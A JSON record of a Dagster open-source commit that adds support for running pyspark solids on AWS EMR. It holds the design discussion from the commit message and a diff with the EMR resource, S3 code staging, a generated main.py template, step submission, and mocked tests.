cluster.\n\n**Options**\n\nWe have a few options that I can think of so far:\n\n1. Open all requisite ports between local machine and EMR cluster for Spark\/YARN\/Hadoop to communicate. This is wildly insecure (YARN has no security, anyone can then submit work to the YARN cluster)  so not a real option. This also would require all of the local Spark\/YARN\/Hadoop installation and XML configs, which is a huge burden to get configured right\u2014imagine how you'd have to reconfigure everything for every cluster you talk to in the ephemeral case.\n2. Maintain SSH tunnels between the local host running dagster and EMR cluster. This is very fragile, as the job will immediately be killed if your networking changes, and annoying to maintain healthy SSH tunnels (I've been down this route, it's a pain). Moreover, it would require configuring the local installations as in (1).\n3. Give up on the tight dagster <> pyspark integration, and just have separate orchestration and compute\u2014this is the norm today in Airflow, where you'd have a Pyspark operator that `subprocess.Popens` a `spark-submit my-pyspark-code.py`, and `my-pyspark-code.py` is a Python file that lives separately from the orchestration Python. EMR APIs effectively work the same, see an example here https:\/\/stackoverflow.com\/a\/37117296\/11295366.\n4. Structure Pyspark solids so that they execute differently on different Spark targets. Locally, we can just assume we can grab a `SparkSession` and go; for submitting the work to EMR, we should wrap execution of the solid into a separate Python file and submit ourselves as a workload to the EMR APIs. EMR expects (1) a main Python file, and (2) a zip archive of associated Python code you'd like to distribute to the Spark workers in the cluster. The EMR APIs will then effectively shell out to `spark-submit` locally on the EMR master, where the Spark installation is configured, such that instantiating a `SparkSession` will work fine.\n\n**Notes**\nThis diff implements a version of (4) above; tracking follow-up issues:\n\n~~1. The overriding of compute behavior based on where we're executing feels janky, and it feels like there's a weird mix of mode\/resource\/compute override going on here.~~\n~~2. The zip archive bundling seems prone to issues\/fragile; I'm building a zip of the Python code I find in the current directory and shipping it to S3; I worry that the `from ... import ...` to gain access to the invoking pipeline will be easy to get wrong.~~ -> will eventually support making this pluggable\n3. There's no guarantee we're going to be able to communicate back to the invoking Dagster instance on the host that kicked off the EMR job, rehydrate resources properly, or generally play nice with the rest of Dagster at all. Ideally we should probably assume we can't, and just use the EMR APIs in the invoking Dagster parent process to read back any metadata from the task execution via the EMR APIs.\n~~4. This bundles setting up the environment and execution into one step, which should be broken apart.~~\n~~5. Need to catch mode mismatches per Alex's comment~~ -> no longer an issue given the switch to resource-based implementation\n\nTest Plan: manual\n\nReviewers: alangenfeld, max, schrockn\n\nReviewed By: schrockn\n\nSubscribers: schrockn, themissinghlink, alangenfeld, max, sashank\n\nDifferential Revision: https:\/\/dagster.phacility.com\/D1349"}},"https:\/\/github.com\/nico525\/dagster-mssql":{"1e02665ca7b2d58f178a499e0ab7b8056a4bab52":{"url":"https:\/\/api.github.com\/repos\/nico525\/dagster-mssql\/commits\/1e02665ca7b2d58f178a499e0ab7b8056a4bab52","html_url":"https:\/\/github.com\/nico525\/dagster-mssql\/commit\/1e02665ca7b2d58f178a499e0ab7b8056a4bab52","message":"pyspark on EMR\n\nSummary:\n**Summary**\nPutting this up for discussion.\n\nThis is a (rough) cut at the thing @sashank, @max and I were discussing on Friday, where we use a decorator to express that a pyspark solid's compute function should behave differently when shipping compute to a remote EMR cluster.\n\n**Context**\nEMR must run pyspark workloads with `yarn` specified as the master URI. To run this way, Spark must have access to a local Hadoop\/Spark\/YARN install on the machine running `spark-submit` or calling `SparkSession.builder.getOrCreate()`, and this local installation must be properly configured with `core-site.xml`, etc. along with all other Hadoop XML files that define the DNS names and hosts in the YARN cluster.\n\nThis is easy when invoking a job directly on the EMR master (already configured), or through the EMR `boto3` APIs, but not something you can set up locally (very difficult to get everything configured correctly, and fragile).\n\nBecause of this, there isn't a way to tell EMR to \"run just this one solid\"\u2014EMR expects us to invoke `spark-submit <options> foo.py` either in a shell command on the master or via the EMR APIs, and it expects `foo.py` to be a self-contained pyspark application.\n\nGiven this, there is no obvious way to have pyspark solids structured like we've done historically, because the locally-constructed `SparkSession` won't be capable of interacting with a remote EMR cluster.\n\n**Options**\n\nWe have a few options that I can think of so far:\n\n1. Open all requisite ports between local machine and EMR cluster for Spark\/YARN\/Hadoop to communicate. This is wildly insecure (YARN has no security, anyone can then submit work to the YARN cluster)  so not a real option. This also would require all of the local Spark\/YARN\/Hadoop installation and XML configs, which is a huge burden to get configured right\u2014imagine how you'd have to reconfigure everything for every cluster you talk to in the ephemeral case.\n2. Maintain SSH tunnels between the local host running dagster and EMR cluster. This is very fragile, as the job will immediately be killed if your networking changes, and annoying to maintain healthy SSH tunnels (I've been down this route, it's a pain). Moreover, it would require configuring the local installations as in (1).\n3. Give up on the tight dagster <> pyspark integration, and just have separate orchestration and compute\u2014this is the norm today in Airflow, where you'd have a Pyspark operator that `subprocess.Popens` a `spark-submit my-pyspark-code.py`, and `my-pyspark-code.py` is a Python file that lives separately from the orchestration Python. EMR APIs effectively work the same, see an example here https:\/\/stackoverflow.com\/a\/37117296\/11295366.\n4. Structure Pyspark solids so that they execute differently on different Spark targets. Locally, we can just assume we can grab a `SparkSession` and go; for submitting the work to EMR, we should wrap execution of the solid into a separate Python file and submit ourselves as a workload to the EMR APIs. EMR expects (1) a main Python file, and (2) a zip archive of associated Python code you'd like to distribute to the Spark workers in the cluster. The EMR APIs will then effectively shell out to `spark-submit` locally on the EMR master, where the Spark installation is configured, such that instantiating a `SparkSession` will work fine.\n\n**Notes**\nThis diff implements a version of (4) above; tracking follow-up issues:\n\n~~1. The overriding of compute behavior based on where we're executing feels janky, and it feels like there's a weird mix of mode\/resource\/compute override going on here.~~\n~~2. The zip archive bundling seems prone to issues\/fragile; I'm building a zip of the Python code I find in the current directory and shipping it to S3; I worry that the `from ... import ...` to gain access to the invoking pipeline will be easy to get wrong.~~ -> will eventually support making this pluggable\n3. There's no guarantee we're going to be able to communicate back to the invoking Dagster instance on the host that kicked off the EMR job, rehydrate resources properly, or generally play nice with the rest of Dagster at all. Ideally we should probably assume we can't, and just use the EMR APIs in the invoking Dagster parent process to read back any metadata from the task execution via the EMR APIs.\n~~4. This bundles setting up the environment and execution into one step, which should be broken apart.~~\n~~5. Need to catch mode mismatches per Alex's comment~~ -> no longer an issue given the switch to resource-based implementation\n\nTest Plan: manual\n\nReviewers: alangenfeld, max, schrockn\n\nReviewed By: schrockn\n\nSubscribers: schrockn, themissinghlink, alangenfeld, max, sashank\n\nDifferential Revision: https:\/\/dagster.phacility.com\/D1349","sha":"1e02665ca7b2d58f178a499e0ab7b8056a4bab52","keyword":"remote code execution insecure","diff":"diff --git a\/.pylintrc b\/.pylintrc\nindex 5fb38167cd..b82f31e2cc 100644\n--- a\/.pylintrc\n+++ b\/.pylintrc\n@@ -20,7 +20,7 @@ disable=C,R,duplicate-code,W0511,W1201,W1202,no-init\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/MANIFEST.in b\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\nindex d03147cbed..9f8b39bc6d 100644\n--- a\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\n+++ b\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\n@@ -1,3 +1,5 @@\n recursive-include dagster_aws *.sh\n recursive-include dagster_aws *.yaml\n+recursive-include dagster_aws *.txt\n+recursive-include dagster_aws *.template\n include LICENSE\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template\nnew file mode 100644\nindex 0000000000..81d5243677\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template\n@@ -0,0 +1,21 @@\n+import sys\n+\n+from pyspark import SparkFiles\n+from pyspark.sql import SparkSession\n+\n+spark = SparkSession.builder.getOrCreate()\n+sc = spark.sparkContext\n+sys.path.insert(0, SparkFiles.getRootDirectory())\n+\n+from dagster import RunConfig\n+from dagster.utils.test import execute_solid_within_pipeline\n+\n+from {pipeline_file} import {pipeline_fn_name}\n+\n+if __name__ == '__main__':\n+    execute_solid_within_pipeline(\n+        {pipeline_fn_name},\n+        '{solid_name}',\n+        environment_dict={environment_dict},\n+        run_config=RunConfig(mode='{mode_name}'),\n+    )\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py\nnew file mode 100644\nindex 0000000000..5da9fe2ec7\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py\n@@ -0,0 +1,237 @@\n+import os\n+\n+import boto3\n+import six\n+from botocore.exceptions import WaiterError\n+from dagster_pyspark import PySparkResourceDefinition\n+from dagster_spark.configs_spark import spark_config\n+from dagster_spark.utils import flatten_dict, format_for_cli\n+\n+from dagster import Field, check, resource\n+from dagster.core.errors import DagsterInvalidDefinitionError\n+from dagster.seven import get_system_temp_directory\n+\n+from .utils import build_main_file, build_pyspark_zip, get_install_requirements_step\n+\n+# On EMR, Spark is installed here\n+EMR_SPARK_HOME = '\/usr\/lib\/spark\/'\n+\n+\n+class EMRPySparkResource(PySparkResourceDefinition):\n+    def __init__(self, config):\n+        self.config = config\n+        self.emr_client = boto3.client('emr', region_name=self.config['region_name'])\n+        self.s3_client = boto3.client('s3', region_name=self.config['region_name'])\n+\n+        # Construct the SparkSession\n+        super(EMRPySparkResource, self).__init__(self.config.get('spark_conf'))\n+\n+    def get_compute_fn(self, fn, solid_name):\n+        '''Construct new compute function for EMR pyspark execution. In the scenario where we are\n+        running on a Dagster box, we will (1) sync the client code to an S3 staging bucket, and then\n+        (2) invoke execution via the EMR APIs.\n+\n+        On EMR, we'll just return the original solid function body to kick off normal pyspark\n+        execution. Since that will be launched on the EMR master node with YARN, it will\n+        automatically use the EMR cluster for execution.\n+        '''\n+\n+        if self.running_on_emr:\n+            return fn\n+\n+        def new_compute_fn(context):\n+            self._sync_code_to_s3(context, solid_name)\n+            step_defs = self._get_execute_steps(context, solid_name)\n+            steps = self.add_job_flow_steps(step_defs)\n+            self.wait_for_steps(context, steps['StepIds'])\n+\n+        return new_compute_fn\n+\n+    def _sync_code_to_s3(self, context, solid_name):\n+        '''Synchronize the pyspark code to an S3 staging bucket for use on EMR. Note that\n+        requirements are installed separately when a requirements.txt is provided.\n+\n+        For the zip file, consider the following toy example:\n+\n+        # Folder: my_pyspark_project\/\n+        # a.py\n+        def foo():\n+            print(1)\n+\n+        # b.py\n+        def bar():\n+            print(2)\n+\n+        # main.py\n+        from a import foo\n+        from b import bar\n+\n+        foo()\n+        bar()\n+\n+        This will zip up `my_pyspark_project\/` as `my_pyspark_project.zip`. Then, when running\n+        `spark-submit --py-files my_pyspark_project.zip main.py` on EMR this will print 1, 2.\n+\n+        Note that we also dynamically construct main.py to support targeting execution of a single\n+        solid on EMR vs. the entire pipeline.\n+        '''\n+        run_id = context.run_id\n+        main_file = os.path.join(get_system_temp_directory(), '%s-main.py' % run_id)\n+        zip_file = os.path.join(get_system_temp_directory(), '%s-pyspark.zip' % run_id)\n+\n+        try:\n+            build_main_file(\n+                main_file,\n+                mode_name=context.pipeline_run.mode,\n+                pipeline_file=self.config['pipeline_file'],\n+                solid_name=solid_name,\n+                environment_dict=context.environment_dict,\n+                pipeline_fn_name=self.config['pipeline_fn_name'],\n+            )\n+\n+            build_pyspark_zip(\n+                zip_file=zip_file,\n+                path=os.path.dirname(os.path.abspath(self.config['pipeline_file'])),\n+            )\n+\n+            self.s3_client.upload_file(\n+                zip_file, self.config['staging_bucket'], run_id + '\/pyspark.zip'\n+            )\n+            self.s3_client.upload_file(\n+                main_file, self.config['staging_bucket'], run_id + '\/main.py'\n+            )\n+\n+        finally:\n+            if os.path.exists(main_file):\n+                os.unlink(main_file)\n+            if os.path.exists(zip_file):\n+                os.unlink(zip_file)\n+\n+    def _get_execute_steps(self, context, solid_name):\n+        '''From the local Dagster instance, construct EMR steps that will kick off execution on a\n+        remote EMR cluster.\n+        '''\n+        action_on_failure = self.config['action_on_failure']\n+        staging_bucket = self.config['staging_bucket']\n+\n+        run_id = context.run_id\n+        local_root = os.path.dirname(os.path.abspath(self.config['pipeline_file']))\n+\n+        steps = []\n+\n+        # Install Python dependencies if a requirements file exists\n+        requirements_file = self.config.get('requirements_file_path')\n+        if requirements_file and not os.path.exists(requirements_file):\n+            raise DagsterInvalidDefinitionError(\n+                'The requirements.txt file that was specified does not exist'\n+            )\n+\n+        if not requirements_file:\n+            requirements_file = os.path.join(local_root, 'requirements.txt')\n+\n+        if os.path.exists(requirements_file):\n+            with open(requirements_file, 'rb') as f:\n+                python_dependencies = six.ensure_str(f.read()).split('\\n')\n+                steps.append(get_install_requirements_step(python_dependencies, action_on_failure))\n+\n+        # Execute Solid via spark-submit\n+        conf = dict(flatten_dict(self.config.get('spark_conf')))\n+        conf['spark.app.name'] = conf.get('spark.app.name', solid_name)\n+\n+        check.invariant(\n+            conf.get('spark.master', 'yarn') == 'yarn',\n+            desc='spark.master is configured as %s; cannot set Spark master on EMR to anything '\n+            'other than \"yarn\"' % conf.get('spark.master'),\n+        )\n+\n+        steps.append(\n+            {\n+                'Name': 'Execute Solid %s' % solid_name,\n+                'ActionOnFailure': action_on_failure,\n+                'HadoopJarStep': {\n+                    'Jar': 'command-runner.jar',\n+                    'Args': [\n+                        EMR_SPARK_HOME + 'bin\/spark-submit',\n+                        '--master',\n+                        'yarn',\n+                        '--deploy-mode',\n+                        conf.get('spark.submit.deployMode', 'client'),\n+                    ]\n+                    + format_for_cli(list(flatten_dict(conf)))\n+                    + [\n+                        '--py-files',\n+                        's3:\/\/%s\/%s\/pyspark.zip' % (staging_bucket, run_id),\n+                        's3:\/\/%s\/%s\/main.py' % (staging_bucket, run_id),\n+                    ],\n+                },\n+            }\n+        )\n+        return steps\n+\n+    def add_job_flow_steps(self, step_defs):\n+        '''Submit the constructed job flow steps to EMR for execution.\n+        '''\n+        return self.emr_client.add_job_flow_steps(\n+            JobFlowId=self.config['job_flow_id'], Steps=step_defs\n+        )\n+\n+    def wait_for_steps(self, context, step_ids):\n+        '''Uses the boto3 waiter to wait for job flow step completion.\n+        '''\n+        waiter = self.emr_client.get_waiter('step_complete')\n+\n+        try:\n+            context.log.info(\n+                'Waiting for steps: '\n+                + str(\n+                    self.emr_client.list_steps(\n+                        ClusterId=self.config['job_flow_id'], StepIds=step_ids\n+                    )\n+                )\n+            )\n+            for step_id in step_ids:\n+                waiter.wait(\n+                    ClusterId=self.config['job_flow_id'],\n+                    StepId=step_id,\n+                    WaiterConfig={'Delay': 5, 'MaxAttempts': 100},\n+                )\n+        except WaiterError:\n+            context.log.warning('Timed out waiting for EMR steps to finish')\n+\n+    @property\n+    def running_on_emr(self):\n+        '''Detects whether we are running on the EMR cluster\n+        '''\n+        if os.path.exists('\/mnt\/var\/lib\/info\/job-flow.json'):\n+            return True\n+        return False\n+\n+\n+@resource(\n+    {\n+        'pipeline_file': Field(str, description='Path to the file where the pipeline is defined'),\n+        'pipeline_fn_name': Field(str),\n+        'spark_config': spark_config(),\n+        'job_flow_id': Field(str, description='Name of the job flow (cluster) on which to execute'),\n+        'region_name': Field(str),\n+        'action_on_failure': Field(str, is_optional=True, default_value='CANCEL_AND_WAIT'),\n+        'staging_bucket': Field(\n+            str,\n+            is_optional=False,\n+            description='S3 staging bucket to use for staging the produced main.py and zip file of'\n+            ' Python code',\n+        ),\n+        'requirements_file_path': Field(\n+            str,\n+            is_optional=True,\n+            description='Path to a requirements.txt file; the current directory is searched if none'\n+            ' is specified.',\n+        ),\n+    }\n+)\n+def emr_pyspark_resource(init_context):\n+    emr_pyspark = EMRPySparkResource(init_context.resource_config)\n+    try:\n+        yield emr_pyspark\n+    finally:\n+        emr_pyspark.stop()\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py\nnew file mode 100644\nindex 0000000000..b6267f9caf\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py\n@@ -0,0 +1,63 @@\n+import copy\n+import os\n+import zipfile\n+\n+import six\n+\n+from dagster.utils import script_relative_path\n+\n+\n+def subset_environment_dict(environment_dict, solid_name):\n+    subset = copy.deepcopy(environment_dict)\n+    if 'solids' in subset:\n+        solid_config_keys = list(subset['solids'].keys())\n+        for key in solid_config_keys:\n+            if key != solid_name:\n+                del subset['solids'][key]\n+    return subset\n+\n+\n+def build_main_file(\n+    main_file, mode_name, pipeline_file, solid_name, environment_dict, pipeline_fn_name\n+):\n+    with open(script_relative_path('main.py.template'), 'rb') as f:\n+        main_template_str = six.ensure_str(f.read())\n+\n+    with open(main_file, 'wb') as f:\n+        f.write(\n+            six.ensure_binary(\n+                main_template_str.format(\n+                    mode_name=mode_name,\n+                    pipeline_file=os.path.splitext(os.path.basename(pipeline_file))[0],\n+                    solid_name=solid_name,\n+                    environment_dict=subset_environment_dict(environment_dict, solid_name),\n+                    pipeline_fn_name=pipeline_fn_name,\n+                )\n+            )\n+        )\n+\n+\n+def build_pyspark_zip(zip_file, path):\n+    '''Archives the current path into a file named `zip_file`\n+    '''\n+    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zf:\n+        for root, _, files in os.walk(path):\n+            for fname in files:\n+                abs_fname = os.path.join(root, fname)\n+\n+                # Skip various artifacts\n+                if 'pytest' in abs_fname or '__pycache__' in abs_fname or 'pyc' in abs_fname:\n+                    continue\n+\n+                zf.write(abs_fname, os.path.relpath(os.path.join(root, fname), path))\n+\n+\n+def get_install_requirements_step(python_dependencies, action_on_failure, python_binary='python3'):\n+    return {\n+        'Name': 'Install Dependencies',\n+        'ActionOnFailure': action_on_failure,\n+        'HadoopJarStep': {\n+            'Jar': 'command-runner.jar',\n+            'Args': ['sudo', python_binary, '-m', 'pip', 'install'] + python_dependencies,\n+        },\n+    }\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt\nnew file mode 100644\nindex 0000000000..f53d93ce79\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt\n@@ -0,0 +1,8 @@\n+boto3\n+dagster\n+dagit\n+dagster_aws\n+dagster_pyspark\n+dagster_spark\n+moto\n+pytest\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py\nnew file mode 100644\nindex 0000000000..2505b1f5d0\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py\n@@ -0,0 +1,116 @@\n+import os\n+\n+import boto3\n+import pytest\n+from dagster_aws.emr.resources import emr_pyspark_resource\n+from dagster_pyspark import pyspark_resource, pyspark_solid\n+from moto import mock_emr\n+\n+from dagster import Field, ModeDefinition, RunConfig, execute_pipeline, pipeline\n+from dagster.seven import mock\n+\n+\n+@pyspark_solid\n+def example_solid(context):\n+    list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+    rdd = context.resources.pyspark.spark_context.parallelize(list_p)\n+    res = rdd.take(2)\n+    for name, age in res:\n+        context.log.info('%s: %d' % (name, age))\n+\n+\n+@pyspark_solid(\n+    name='blah', description='this is a test', config={'foo': Field(str), 'bar': Field(int)}\n+)\n+def other_example_solid(context):\n+    list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+    rdd = context.resources.pyspark.spark_context.parallelize(list_p)\n+    res = rdd.take(2)\n+    for name, age in res:\n+        context.log.info('%s: %d' % (name, age))\n+\n+\n+@pipeline(\n+    mode_defs=[\n+        ModeDefinition('prod', resource_defs={'pyspark': emr_pyspark_resource}),\n+        ModeDefinition('local', resource_defs={'pyspark': pyspark_resource}),\n+    ]\n+)\n+def example_pipe():\n+    example_solid()\n+    other_example_solid()\n+\n+\n+def test_local():\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},},\n+        run_config=RunConfig(mode='local'),\n+    )\n+    assert result.success\n+\n+\n+@mock_emr\n+@mock.patch('dagster_aws.emr.resources.EMRPySparkResource.wait_for_steps')\n+def test_pyspark_emr(mock_wait):\n+    client = boto3.client('emr', region_name='us-west-1')\n+\n+    run_job_flow_args = dict(\n+        Instances={\n+            'InstanceCount': 1,\n+            'KeepJobFlowAliveWhenNoSteps': True,\n+            'MasterInstanceType': 'c3.medium',\n+            'Placement': {'AvailabilityZone': 'us-west-1a'},\n+            'SlaveInstanceType': 'c3.xlarge',\n+        },\n+        JobFlowRole='EMR_EC2_DefaultRole',\n+        LogUri='s3:\/\/mybucket\/log',\n+        Name='cluster',\n+        ServiceRole='EMR_DefaultRole',\n+        VisibleToAllUsers=True,\n+    )\n+\n+    job_flow_id = client.run_job_flow(**run_job_flow_args)['JobFlowId']\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={\n+            'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+            'resources': {\n+                'pyspark': {\n+                    'config': {\n+                        'pipeline_file': __file__,\n+                        'pipeline_fn_name': 'example_pipe',\n+                        'job_flow_id': job_flow_id,\n+                        'staging_bucket': 'dagster-scratch-80542c2',\n+                        'region_name': 'us-west-1',\n+                    }\n+                }\n+            },\n+        },\n+        run_config=RunConfig(mode='prod'),\n+    )\n+    assert result.success\n+    assert mock_wait.called_once\n+\n+\n+@pytest.mark.skip\n+def test_do_it_live_emr():\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={\n+            'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+            'resources': {\n+                'pyspark': {\n+                    'config': {\n+                        'pipeline_file': __file__,\n+                        'pipeline_fn_name': 'example_pipe',\n+                        'job_flow_id': os.environ.get('AWS_EMR_JOB_FLOW_ID'),\n+                        'staging_bucket': 'dagster-scratch-80542c2',\n+                        'region_name': 'us-west-1',\n+                    }\n+                }\n+            },\n+        },\n+        run_config=RunConfig(mode='prod'),\n+    )\n+    assert result.success\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py\nnew file mode 100644\nindex 0000000000..f23691ea3a\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py\n@@ -0,0 +1,23 @@\n+from dagster_aws.emr.utils import subset_environment_dict\n+\n+\n+def test_subset_environment_dict():\n+    environment_dict = {\n+        'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+        'resources': {\n+            'pyspark': {\n+                'config': {\n+                    'pipeline_file': 'dagster_aws_tests\/emr_tests\/test_pyspark.py',\n+                    'pipeline_fn_name': 'pipe',\n+                    'job_flow_id': 'j-272P42200OZ0Q',\n+                    'staging_bucket': 'dagster-scratch-80542c2',\n+                    'region_name': 'us-west-1',\n+                }\n+            }\n+        },\n+    }\n+    res = subset_environment_dict(environment_dict, 'blah')\n+    assert res == environment_dict\n+\n+    res = subset_environment_dict(environment_dict, 'not_here')\n+    assert res['solids'] == {}\ndiff --git a\/python_modules\/libraries\/dagster-aws\/setup.py b\/python_modules\/libraries\/dagster-aws\/setup.py\nindex acfa7dd513..892c7befed 100644\n--- a\/python_modules\/libraries\/dagster-aws\/setup.py\n+++ b\/python_modules\/libraries\/dagster-aws\/setup.py\n@@ -39,8 +39,8 @@ def _do_setup(name='dagster-aws'):\n         packages=find_packages(exclude=['test']),\n         include_package_data=True,\n         install_requires=['boto3==1.9.*', 'dagster', 'requests', 'terminaltables'],\n+        extras_require={'pyspark': ['dagster-pyspark']},\n         tests_require=['moto==1.3.*'],\n-        extras_require={':python_version<\"3\"': ['backports.tempfile']},\n         entry_points={'console_scripts': ['dagster-aws = dagster_aws.cli.cli:main']},\n         zip_safe=False,\n     )\ndiff --git a\/python_modules\/libraries\/dagster-aws\/tox.ini b\/python_modules\/libraries\/dagster-aws\/tox.ini\nindex f84b4bbfdf..bf5270ee64 100644\n--- a\/python_modules\/libraries\/dagster-aws\/tox.ini\n+++ b\/python_modules\/libraries\/dagster-aws\/tox.ini\n@@ -10,6 +10,8 @@ platform =\n deps =\n   -e ..\/..\/dagster\n   -r ..\/..\/dagster\/dev-requirements.txt\n+  -e ..\/dagster-spark\n+  -e ..\/dagster-pyspark\n   -r .\/dev-requirements.txt\n   -e .\n usedevelop = true\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\nindex 5f1367b451..94eef4bb83 100644\n--- a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\n@@ -1,10 +1,7 @@\n import os\n \n-from dagster_spark.configs_spark import spark_config\n-from dagster_spark.utils import flatten_dict\n from pyspark.rdd import RDD\n from pyspark.sql import DataFrame as NativeSparkDataFrame\n-from pyspark.sql import SparkSession\n \n from dagster import (\n     Bool,\n@@ -22,6 +19,14 @@\n from dagster.core.types import Selector, input_selector_schema, output_selector_schema\n from dagster.core.types.runtime import define_any_type\n \n+from .decorators import pyspark_solid\n+from .resources import (\n+    PySparkResourceDefinition,\n+    pyspark_resource,\n+    spark_session_from_config,\n+    spark_session_resource,\n+)\n+\n \n @input_selector_schema(\n     Selector(\n@@ -78,25 +83,6 @@ def write_rdd(context, file_type, file_options, spark_rdd):\n )\n \n \n-def spark_session_from_config(spark_conf=None):\n-    spark_conf = check.opt_dict_param(spark_conf, 'spark_conf')\n-    builder = SparkSession.builder\n-    flat = flatten_dict(spark_conf)\n-    for key, value in flat:\n-        builder = builder.config(key, value)\n-\n-    return builder.getOrCreate()\n-\n-\n-@resource({'spark_conf': spark_config()})\n-def spark_session_resource(init_context):\n-    spark = spark_session_from_config(init_context.resource_config['spark_conf'])\n-    try:\n-        yield spark\n-    finally:\n-        spark.stop()\n-\n-\n @output_selector_schema(\n     Selector(\n         {\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py\nnew file mode 100644\nindex 0000000000..ee8fd82c47\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py\n@@ -0,0 +1,63 @@\n+from dagster import check, solid\n+\n+\n+def pyspark_solid(\n+    name=None,\n+    description=None,\n+    input_defs=None,\n+    output_defs=None,\n+    config=None,\n+    required_resource_keys=None,\n+    metadata=None,\n+    step_metadata_fn=None,\n+    pyspark_resource_key=None,\n+):\n+    # Permit the user to provide a named pyspark resource\n+    pyspark_resource_key = check.opt_str_param(\n+        pyspark_resource_key, 'pyspark_resource_key', default='pyspark'\n+    )\n+\n+    # Expect a pyspark resource\n+    required_resource_keys = check.opt_set_param(required_resource_keys, 'required_resource_keys')\n+    required_resource_keys.add(pyspark_resource_key)\n+\n+    # nonlocal keyword not available in Python 2\n+    non_local = {'name': name, 'required_resource_keys': required_resource_keys}\n+\n+    # Handle when we're called bare without arguments (e.g. name is actually the callable, not the\n+    # solid name)\n+    if callable(name):\n+\n+        @solid(name=name.__name__, required_resource_keys=required_resource_keys)\n+        def new_compute_fn(context):\n+            return context.resources.pyspark.get_compute_fn(fn=name, solid_name=name.__name__)(\n+                context\n+            )\n+\n+        return new_compute_fn\n+\n+    def wrap(fn):\n+        name = non_local['name'] or fn.__name__\n+\n+        @solid(\n+            name=name,\n+            description=description,\n+            input_defs=input_defs,\n+            output_defs=output_defs,\n+            config=config,\n+            required_resource_keys=non_local['required_resource_keys'],\n+            metadata=metadata,\n+            step_metadata_fn=step_metadata_fn,\n+        )\n+        def new_compute_fn(context):\n+            from .resources import PySparkResourceDefinition\n+\n+            spark = check.inst(\n+                getattr(context.resources, pyspark_resource_key), PySparkResourceDefinition\n+            )\n+\n+            return spark.get_compute_fn(fn, name)(context)\n+\n+        return new_compute_fn\n+\n+    return wrap\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py\nnew file mode 100644\nindex 0000000000..fc3b956019\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py\n@@ -0,0 +1,61 @@\n+import abc\n+\n+import six\n+from dagster_spark.configs_spark import spark_config\n+from dagster_spark.utils import flatten_dict\n+from pyspark.sql import SparkSession\n+\n+from dagster import check, resource\n+\n+\n+def spark_session_from_config(spark_conf=None):\n+    spark_conf = check.opt_dict_param(spark_conf, 'spark_conf')\n+    builder = SparkSession.builder\n+    flat = flatten_dict(spark_conf)\n+    for key, value in flat:\n+        builder = builder.config(key, value)\n+\n+    return builder.getOrCreate()\n+\n+\n+class PySparkResourceDefinition(six.with_metaclass(abc.ABCMeta)):\n+    def __init__(self, spark_conf):\n+        self._spark_session = spark_session_from_config(spark_conf)\n+\n+    @property\n+    def spark_session(self):\n+        return self._spark_session\n+\n+    @property\n+    def spark_context(self):\n+        return self.spark_session.sparkContext\n+\n+    def stop(self):\n+        self._spark_session.stop()\n+\n+    